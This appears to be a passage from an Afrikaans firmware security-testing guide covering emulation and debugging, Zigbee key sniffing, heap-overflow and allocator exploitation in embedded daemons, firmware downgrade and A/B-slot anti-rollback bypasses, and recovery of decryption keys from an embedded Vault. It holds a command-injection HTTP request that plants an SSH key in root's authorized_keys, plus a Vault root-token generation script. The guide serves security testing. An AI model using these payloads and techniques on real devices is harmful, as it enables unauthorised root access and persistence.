Op hierdie stadium word ’n werklike of geëmuleerde toestelomgewing vir analise gebruik. Dit is noodsaaklik om shell-toegang tot die bedryfstelsel en lêerstelsel te behou. Emulasie boots hardeware-interaksies moontlik nie perfek na nie, wat soms herbegin van die emulasie noodsaak. Analise behoort die lêerstelsel weer te ondersoek, blootgestelde webblaaie en netwerkdienste te benut en kwesbaarhede in die selflaaiprogram te ondersoek. Firmware-integriteitstoetse is noodsaaklik om moontlike backdoor-kwesbaarhede te identifiseer.

## Tegnieke vir Runtime-analise

Runtime-analise behels interaksie met ’n proses of binêre lêer in sy bedryfsomgewing. Daar word gereedskap soos gdb-multiarch, Frida en Ghidra gebruik om breekpunte te stel en kwesbaarhede deur fuzzing en ander tegnieke te identifiseer.

Vir ingebedde teikens sonder ’n volledige debugger, **kopieer ’n staties gekoppelde `gdbserver`** na die toestel en koppel op afstand daaraan:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / kartering van radio-coprocessorboodskappe

Op IoT-hubs word die RF-stack dikwels verdeel tussen ’n **radio-MCU** en ’n Linux-userlandproses. ’n Nuttige werksvloei is om die pad te karteer:<sup>[[8]](#references)</sup>

1. **RF-raam** deur die lug
2. **beheerderkant-parser** op die radio-MCU
3. **seriële/UART-teks- of TLV-protokol** wat na Linux aangestuur word (byvoorbeeld `/dev/tty*`)
4. **toepassingsdispatcher** in die hoofdemon
5. **protokolspesifieke handler / state machine**

Hierdie argitektuur skep twee reversing-teikens in plaas van een. As die beheerder binêre radioprasse omskakel na ’n tekstuele protokol soos `Group,Command,arg1,arg2,...`, bepaal:

- Die **boodskapgroepe** en dispatch-tabelle
- Watter boodskappe van die **netwerk** kan kom teenoor dié wat van die beheerder self kom
- Die presiese **vervaardigerspesifieke diskrimineerdervelde** (byvoorbeeld Zigbee se `manufacturer_code` en pasgemaakte `cluster_command`)
- Watter handlers slegs bereikbaar is tydens **commissioning**, ontdekking of fases waarin firmware/modelle afgelaai word

Vir Zigbee spesifiek: vang pairing-verkeer vas en kyk of die teiken steeds op die verstek-**Link Key** `ZigBeeAlliance09` staatmaak. Indien wel, kan die sniffing van commissioning-verkeer die **Network Key** blootlê. Zigbee 3.0-install codes verminder hierdie blootstelling; let dus op of die getoetste toestel dit werklik afdwing.

### Vervaardigerspesifieke protokolhandlers en FSM-beheerde bereikbaarheid

Vervaardigerspesifieke Zigbee/ZCL-opdragte is dikwels ’n beter teiken as gestandaardiseerde clusters omdat hulle **pasgemaakte ontledingskode** en interne **FSM’s** bereik, waar die validering minder getoets is.<sup>[[8]](#references)</sup>

Praktiese werksvloei:

- Reverse-engineer die opdragdispatcher totdat jy die **handler wat net vir die vervaardiger bedoel is** vind.
- Bepaal die tabelle vir **FSM-toestand**, **gebeurtenis**, **kontrole**, **aksie** en **volgende toestand**.
- Identifiseer **oorgangstoestande** wat outomaties voortgaan, asook herprobeer-/foutvertakkings wat uiteindelik aanvallerbeheerde toestand terugstel of vrymaak.
- Bevestig watter wettige protokoluitruilings nodig is om die demoon in die kwesbare toestand te plaas, eerder as om aan te neem dat die foutiewe handler altyd bereikbaar is.

Vir tydsensitiewe protokolle kan pakketherhaling vanaf ’n Python-framework te stadig wees. ’n Betroubaarder benadering is om ’n wettige toestel op werklike hardeware (byvoorbeeld ’n **nRF52840**) na te boots met ’n vervaardigervlak-stack, sodat jy die korrekte **eindpunte**, **attribute** en commissioning-tydsberekening kan blootstel.

### Klas van foute in gefragmenteerde aflaaie in ingebedde demone

’n Herhalende klas firmwarefoute kom voor in **aflaaie van gefragmenteerde blobs/modelle/konfigurasies**:<sup>[[8]](#references)</sup>

1. Die **eerste fragment** (`offset == 0`) stoor `ctx->total_size` en ken `malloc(total_size)` toe.
2. Latere fragmente valideer slegs die aanvallerbeheerde **pakketplaaslike** velde, soos `packet_total_size >= offset + chunk_len`.
3. Die kopie gebruik `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sonder om teen die **oorspronklike toegekende grootte** te kontroleer.

Dit laat ’n aanvaller toe om:

- ’n Geldige eerste fragment met ’n **klein** verklaarde totale grootte te stuur om ’n klein heap-toekenning af te dwing.
- ’n Latere fragment met die **verwagte offset**, maar ’n groter `chunk_len`, te stuur.
- ’n vervalste pakketplaaslike grootte te gebruik wat die nuwe kontroles slaag, maar steeds die buffer wat oorspronklik toegeken is, oorloop.

Wanneer die kwesbare pad agter commissioning-logika sit, moet die uitbuiting genoeg **toestelnabootsing** insluit om die teiken in die verwagte modelaflaai- of blobaflaaitoestand te plaas voordat die misvormde fragmente gestuur word.

### Protokolgedrewe `free()`-snellers

In ingebedde demone is die maklikste manier om heap-metadata-uitbuiting te aktiveer dikwels nie om “vir opruiming te wag” nie, maar om **die protokol se eie foutafhandeling af te dwing**:<sup>[[8]](#references)</sup>

- Stuur misvormde opvolgfragmente om die FSM na **herprobeer-** of **fouttoestande** te stuur.
- Oorskry die herprobeerdrempel sodat die demoon die **konteks terugstel** en die korrupte buffer vrystel.
- Gebruik hierdie voorspelbare `free()` om allocator-kant-primitiewe te aktiveer voordat die proses om onverwante redes ineenstort.

Dit is veral nuttig teen **musl/uClibc/dlmalloc-agtige** allocators in ingebedde Linux, waar korrupsie van chunk-metadata unlink/unbin-logika in ’n skryfprimitief kan omskep. ’n Stabiele patroon is om ’n **grootteveld** te korrupteer om allocator-traversering na **vervalste chunks wat binne die oorlopende buffer geplaas is** te herlei, in plaas daarvan om werklike bin-wysers onmiddellik te beskadig en die proses te laat ineenstort.

## Binêre uitbuiting en Proof-of-Concept

Om ’n PoC vir geïdentifiseerde kwesbaarhede te ontwikkel, vereis ’n diep begrip van die teikenargitektuur en programmering in laervlaktale. Binêre runtime-beskermings is skaars in ingebedde stelsels, maar wanneer hulle teenwoordig is, kan tegnieke soos Return Oriented Programming (ROP) nodig wees.

### uClibc-fastbin-uitbuitingsnotas (ingebedde Linux)

- **Fastbins + konsolidasie:** uClibc gebruik fastbins soortgelyk aan glibc. ’n Latere groot toekenning kan `__malloc_consolidate()` aktiveer, dus moet enige vervalste chunk kontroles slaag (redelike grootte, `fd = 0`, en omliggende chunks wat as “in gebruik” beskou word).<sup>[[6]](#references)</sup>
- **Nie-PIE-binaries onder ASLR:** as ASLR geaktiveer is maar die hoofbinêre lêer **nie-PIE** is, is adresse binne die binêre lêer se `.data/.bss` stabiel. Jy kan ’n gebied teiken wat reeds soos ’n geldige heap-chunk-kop lyk om ’n fastbin-toekenning op ’n **funksiewysertabel** te laat beland.
- **NUL wat parser stop:** wanneer JSON ontleed word, kan ’n `\x00` in die payload die ontleding stop terwyl dit daaropvolgende aanvallerbeheerde grepe behou vir ’n stack pivot/ROP-ketting.
- **Shellcode via `/proc/self/mem`:** ’n ROP-ketting wat `open("/proc/self/mem")`, `lseek()` en `write()` aanroep, kan uitvoerbare shellcode in ’n bekende mapping plaas en daarna daarheen spring.

## Voorbereide bedryfstelsels vir firmware-ontleding

Bedryfstelsels soos [AttifyOS](https://github.com/adi0x90/attifyos) en [EmbedOS](https://github.com/scriptingxss/EmbedOS) bied voorafgekonfigureerde omgewings vir firmware-sekuriteitstoetsing, toegerus met die nodige nutsmiddels.

## Voorbereide bedryfstelsels vir firmware-ontleding

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is ’n distro wat bedoel is om jou te help met sekuriteitsassessering en penetrasietoetsing van Internet of Things (IoT)-toestelle. Dit spaar jou baie tyd deur ’n voorafgekonfigureerde omgewing met al die nodige nutsmiddels te bied.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): ’n Bedryfstelsel vir ingebedde-sekuriteitstoetsing, gebaseer op Ubuntu 18.04 en vooraf gelaai met nutsmiddels vir firmware-sekuriteitstoetsing.

## Firmware-afgraderingsaanvalle en onveilige opdateringsmeganismes

Selfs wanneer ’n vervaardiger kriptografiese handtekeningkontroles vir firmwarebeelde implementeer, word **beskerming teen weergawe-terugrol (afgradering)** dikwels weggelaat. Wanneer die selflaai- of herstel-laaier slegs die handtekening met ’n ingebedde publieke sleutel verifieer, maar nie die *weergawe* (of ’n monotone teller) van die beeld wat geïnstalleer word, vergelyk nie, kan ’n aanvaller wettiglik ’n **ouer, kwesbare firmware installeer wat steeds ’n geldige handtekening dra** en sodoende reggestelde kwesbaarhede weer bekendstel.<sup>[[4]](#references)</sup>

Tipiese aanvalswerksvloei:

1. **Verkry ’n ouer, ondertekende beeld**
   * Kry dit van die vervaardiger se openbare aflaaiportaal, CDN of ondersteuningswebwerf.
   * Onttrek dit uit gepaardgaande mobiele-/werkskermtoepassings (bv. binne ’n Android-APK onder `assets/firmware/`).
   * Kry dit by derdeparty-bewaarplekke soos VirusTotal, internetargiewe, forums, ens.
2. **Laai die beeld op na die toestel of bedien dit aan die toestel** via enige blootgestelde opdateringskanaal:
   * Web-UI, mobiele-toepassings-API, USB, TFTP, MQTT, ens.
   * Baie IoT-toestelle vir verbruikers stel *ongeverifieerde* HTTP(S)-eindpunte bloot wat Base64-geënkodeerde firmwareblobs aanvaar, dit aan die bedienerkant dekodeer en herstel/opgradering aktiveer.
3. Ná die afgradering, exploit ’n kwesbaarheid wat in die nuwer weergawe reggestel is (byvoorbeeld ’n command-injection-filter wat later bygevoeg is).
4. Flits opsioneel die nuutste beeld terug of deaktiveer opdaterings om opsporing te vermy sodra volharding verkry is.

### Voorbeeld: Command Injection ná afgradering

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

In die kwesbare (afgegradeerde) firmware word die `md5`-parameter direk sonder sanitisering by ’n shell-opdrag gevoeg, wat die inspuiting van arbitrêre opdragte moontlik maak (hier om SSH-sleutelgebaseerde worteltoegang te aktiveer). Latere firmwareweergawes het ’n basiese karakterfilter ingevoer, maar omdat daar geen beskerming teen afgradering is nie, is die regstelling nutteloos.<sup>[[4]](#references)</sup>

### Onttrekking van firmware uit mobiele toepassings

Baie verskaffers sluit volledige firmwarebeelde in hul gepaardgaande mobiele toepassings in, sodat die toepassing die toestel via Bluetooth/Wi-Fi kan opdateer. Hierdie pakkette word gewoonlik ongeënkripteer in die APK/APEX gestoor, onder paaie soos `assets/fw/` of `res/raw/`. Met nutsmiddels soos `apktool`, `ghidra` of selfs gewone `unzip` kan jy ondertekende beelde uittrek sonder om aan die fisiese hardeware te raak.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Omseiling van anti-rollback slegs in die updater in A/B-slotontwerpe

Sommige verskaffers implementeer wel ’n anti-downgrade-**ratchet**, maar slegs binne die *updater*-logika (byvoorbeeld ’n UDS-roetine oor CAN, ’n herstelopdrag of ’n userspace OTA-agent). As die **bootloader** later net die beeld se handtekening/CRC nagaan en die partisietabel of slotmetadata vertrou, kan rollback-beskerming steeds omseil word.<sup>[[7]](#references)</sup>

Tipiese swak ontwerp:

- Firmwaremetadata bevat beide ’n weergawebeskrywer en ’n **security ratchet** / monotone teller.
- Die updater vergelyk die beeld se ratchet met ’n waarde wat in aanhoudende berging gestoor is en verwerp ouer ondertekende beelde.
- Die bootloader ontleed nie daardie ratchet nie en verifieer slegs die kopskrif, CRC en handtekening voordat dit die gekose slot begin.
- Slotaktivering word afsonderlik in ’n partisietabel of per-slot-generasieteller gestoor en is nie kriptografies gekoppel aan die presiese firmwaredigest wat gevalideer is nie.

Dit skep ’n **valideer-een-beeld / begin-’n-ander-beeld**-primitief in dubbelslotstelsels. As die aanvaller die updater kan laat merk dat slot B die volgende teiken vir selflaai is deur ’n huidige ondertekende beeld te gebruik, en slot B later voor herbegin kan oorskryf, kan die bootloader steeds die afgegradeerde beeld begin omdat dit slegs die reeds vasgelegde slotmetadata vertrou.

Algemene misbruikpatroon:

1. Laai ’n **huidige ondertekende** firmware na die passiewe slot op en voer die normale validerings-/skakelroetine uit sodat die uitleg daardie slot as volgende aktief merk.
2. **Moenie nog herbegin nie**. Voer die slotvoorbereidings-/uitroetine weer in dieselfde sessie uit.
3. Misbruik verouderde selflaaitoestand- of slotkeuse-logika sodat die updater dieselfde fisiese slot uitvee wat pas bevorder is.
4. Skryf ’n **ouer, maar steeds ondertekende** firmware na daardie slot.
5. Slaan die valideringsroetine wat die ratchet afdwing oor en herbegin direk.
6. Die bootloader kies die bevorderde slot, verifieer slegs die handtekening/integriteit en begin die ou beeld.

Dinge waarna jy moet soek wanneer jy A/B-opdateringsimplementasies reverse-engineer:

- Slotkeuse wat afgelei word van **selflaaitydvlae** wat nie ná ’n suksesvolle skakeling verfris word nie.
- ’n `prepare_passive_slot()`-agtige roetine wat ’n slot uitvee op grond van verouderde toestand in plaas van die **huidige vasgelegde uitleg**.
- ’n `part_write_layout()`-agtige funksie wat slegs ’n **generasieteller** / aktiewe vlag verhoog en nie die gevalideerde beeldhash stoor nie.
- Ratchet-kontroles wat in userspace- of updater-kode geïmplementeer is, maar **nie** in ROM-, bootloader- of secure-boot-stadia nie.
- Uitvee- of herstelroetines wat die slot as selflaaibaar gemerk laat, selfs nadat die inhoud daarvan verwyder en oorgeskryf is.

### Kontrolelys vir die beoordeling van opdateringslogika

* Is die vervoer/aanmelding van die *update endpoint* voldoende beskerm (TLS + authentication)?
* Vergelyk die toestel **weergawenommers** of ’n **monotone anti-rollback-teller** voordat dit flits?
* Word die beeld binne ’n secure boot-ketting geverifieer (bv. handtekeninge wat deur ROM-kode nagegaan word)?
* Dwing die **bootloader dieselfde ratchet as die updater af**, eerder as om slegs die handtekening/CRC na te gaan?
* Is slotaktiveringsmetadata **gekoppel aan die gevalideerde firmwaredigest/-weergawe**, of kan ’n slot ná bevordering gewysig word?
* Word die toestel gedwing om te herbegin nadat ’n slotskakeling slaag, of is latere opdaterings-/uitroetines steeds in dieselfde sessie bereikbaar?
* Voer userland-kode bykomende gesonde-verstand-kontroles uit (bv. toegelate partisiekartering, modelnommer)?
* Hergebruik *gedeeltelike* of *rugsteun*-opdateringsvloeie dieselfde valideringslogika?

> 💡  As enige van bogenoemde ontbreek, is die platform waarskynlik kwesbaar vir rollback-aanvalle.

## Kwesbare firmware om mee te oefen

Om kwesbaarhede in firmware te leer ontdek, gebruik die volgende kwesbare firmwareprojekte as ’n beginpunt.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Herwinning van firmware-dekripsiesleutels uit ingebedde KMS/Vault-toestand

Wanneer ’n opdateringsbeeld klein metadata in gewone teks met ’n groot blob met hoë entropie meng, doen houertriage voordat jy enigiets brute-force:<sup>[[1]](#references)</sup>

- Stort kopskrifte, afsetwaardes en reëlgrense met `hexdump`, `xxd`, `strings -tx`, `base64 -d` en `binwalk -E`.
- `Salted__` dui gewoonlik op die OpenSSL `enc`-formaat: die volgende 8 grepe is die sout en die oorblywende grepe is die syferteks.
- ’n Base64-veld wat na presies `256` grepe dekodeer, is ’n sterk aanduiding dat dit ’n RSA-2048-syferteks is wat ’n ewekansige firmwarewagwoord/sessiesleutel omvou.
- Losstaande PGP-materiaal in dieselfde lêer beskerm dikwels slegs egtheid; moenie aanvaar dat dit die vertroulikheidsmeganisme is nie.

As statiese soektogte na sleutels (`grep`, `strings`, PEM/PGP-soektogte) misluk, reverse-engineer eerder die **operasionele dekripsiepad** as om net na private sleutels te soek:

- Decompileer die updater-/bestuursbinary en volg wie die geënkripteerde blob lees, watter helper/API dit ontbondel en watter logiese sleutelnaam dit aanvra.
- Soek in die onttrekte wortellêerstelsel na KMS-toestand (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), asook eenheidlêers en init-skripte.
- Behandel gewone teks soos `vault operator unseal ...`, herstelsleutels, bootstrap-tokens of plaaslike KMS-outo-ontseëlskripte as ekwivalent aan private-sleutelmateriaal.

As die toestel die oorspronklike Vault-binary en bergingbackend insluit, is dit gewoonlik makliker om daardie omgewing te herspeel as om Vault se interne werking te herimplementeer:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Met root op die gekloonde KMS:

- Maak transit-sleutels slegs binne die geïsoleerde kloon uitvoerbaar: `vault write transit/keys/<name>/config exportable=true`
- Voer die unwrap-sleutel uit: `vault read transit/export/encryption-key/<name>`
- Probeer die herstelde RSA-sleutel met die presiese padding/hash-paar wat deur die KMS gebruik word. ’n Mislukte PKCS#1 v1.5-dekripsie en ’n mislukte verstek-OAEP-dekripsie bewys **nie** dat die sleutel verkeerd is nie; baie Vault-gesteunde vloeie gebruik OAEP met SHA-256, terwyl algemene biblioteke SHA-1 as verstek gebruik.
- As die loonvrag met `Salted__` begin, reproduseer die verskaffer se OpenSSL-KDF presies (`EVP_BytesToKey`, dikwels MD5 op verouderde toestelle) voordat jy AES-CBC-dekripsie probeer.

Dit verander "geënkripteerde firmware" in ’n meer algemene probleem: **herwin die toestel se operasionele sleutels, en reproduseer dan die presiese unwrap- en KDF-parameters vanlyn**.

## Opleiding en Sertifisering

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Firmware kraak met Claude: vaardighede op seniorvlak, outonomie op juniorvlak](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologie vir firmware-sekuriteitstoetsing](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktiese IoT-inbraak: Die definitiewe gids vir aanvalle op die Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Uitbuiting van zero-days in verlate hardeware – Trail of Bits-blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Hoe ’n slimtoestel van $20 my toegang tot jou huis gegee het](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Nou sien jy mi: nou is jy Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Uitbuiting van die Tesla Wall Connector via sy laaipoortverbinding - Deel 2: omseiling van die anti-terugdatering](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Laat dit flikker: Lugoor-uitbuiting van die Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS op QEMU Deel 1: Uitpak](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux-kerneldokumentasie - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS op QEMU Deel 2: Ontfouting en regstelling](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS-wagwoorde: Swak XOR-enkripsie maak herstel vanaf SPI Flash moontlik (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Gereedskap vir herstel van Dell BIOS-wagwoorde](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
